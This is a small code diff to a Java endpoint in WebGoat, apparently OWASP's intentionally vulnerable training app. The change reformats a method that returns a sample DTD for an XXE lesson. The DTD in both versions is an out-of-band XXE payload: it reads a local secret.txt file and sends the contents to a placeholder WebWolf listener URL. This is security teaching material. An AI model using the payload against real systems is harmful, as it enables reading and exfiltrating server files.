@@ -91,12 +91,12 @@ public class SimpleXXE extends AssignmentEndpoint {
     @RequestMapping(path = "/xxe/sampledtd", consumes = ALL_VALUE, produces = MediaType.TEXT_PLAIN_VALUE)
     @ResponseBody
     public String getSampleDTDFile() {
-        return """
-                <?xml version="1.0" encoding="UTF-8"?>
-                <!ENTITY % file SYSTEM "file:replace-this-by-webgoat-temp-directory/XXE/secret.txt">
-                <!ENTITY % all "<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>">
-                %all;
-                """;
+        return "" + 
+               "<?xml version=\"1.0\" encoding=\"UTF-8\"?>" + 
+               "<!ENTITY % file SYSTEM \"file:replace-this-by-webgoat-temp-directory/XXE/secret.txt\">" + 
+               "<!ENTITY % all \"<!ENTITY send SYSTEM 'http://replace-this-by-webwolf-base-url/landing?text=%file;'>\">" + 
+               "%all;" + 
+               "";
     }
 
 }
